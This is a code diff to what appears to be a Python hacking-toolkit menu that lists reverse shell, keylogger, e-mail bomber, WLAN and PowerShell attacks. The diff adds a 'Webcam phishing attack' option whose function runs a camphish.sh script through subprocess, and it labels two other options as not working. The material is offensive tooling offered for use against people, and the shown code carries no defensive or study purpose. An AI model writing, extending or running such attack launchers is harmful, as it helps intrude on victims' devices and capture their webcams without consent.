@@ -6,6 +6,7 @@ import os
 import time
 import smtplib
 import sys
+import subprocess
 
 
 
@@ -414,10 +415,15 @@ def mail_attack():
 def wlan_attack():
     pass
 
+
 def powershell_attack():
     pass
 
-
+def WebCamAttack():
+    try:
+        subprocess.call("bash webcam/camphish.sh")
+    except:
+        print("Critical error. Exit.")
 
 def main_menu():
     os.system("color a")
@@ -432,8 +438,9 @@ def main_menu():
     print("2) Reverse shell attack")
     print("3) Keylogger attack")
     print("4) E-mail bomber attack")
-    print("5) WLAN Attack (WPA2)")
-    print("6) Powershell attack")
+    print("5) WLAN Attack (WPA2) (Not working...)")
+    print("6) Powershell attack (Not working...)")
+    print("7) Webcam phishing attack")
     print("")
     print("99) Exit")
 
@@ -451,6 +458,8 @@ def main_menu():
         wlan_attack()
     elif choose_attack == 6:
         powershell_attack()
+    elif choose_attack == 7:
+        WebCamAttack()
     elif choose_attack == 99:
         quit("Bye!")
 
